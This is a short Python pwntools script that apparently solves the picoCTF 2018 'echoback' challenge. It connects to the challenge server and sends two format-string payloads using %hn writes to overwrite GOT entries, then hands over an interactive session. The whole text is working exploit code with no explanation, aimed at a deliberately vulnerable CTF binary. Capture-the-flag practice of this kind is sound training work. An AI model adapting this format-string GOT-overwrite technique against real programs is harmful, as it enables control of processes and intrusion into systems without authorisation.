from pwn import *

#r = process('./echoback')
r = remote('2018shell2.picoctf.com', 37402)

payload = ''
payload += p32(0x804a01c)
payload += p32(0x804a01c + 2)
payload += '%' + str((0x080485ab & 0xffff) - 4*2) + 'x'
payload += '%7$hn'
payload += '%' + str(0x10000 + ((0x080485ab >> 16) - (0x080485ab & 0xffff)))  + 'x'
payload += '%8$hn'

pause()
r.sendafter('input your message:', payload)

payload = ''
payload += p32(0x804a010)
payload += p32(0x804a010 + 2)
payload += '%' + str((0x08048460 & 0xffff) - 4*2) + 'x'
payload += '%7$hn'
payload += '%' + str(0x10000 + ((0x08048460 >> 16) - (0x08048460 & 0xffff)))  + 'x'
payload += '%8$hn'

pause()
r.sendafter('input your message:', payload)

r.interactive()
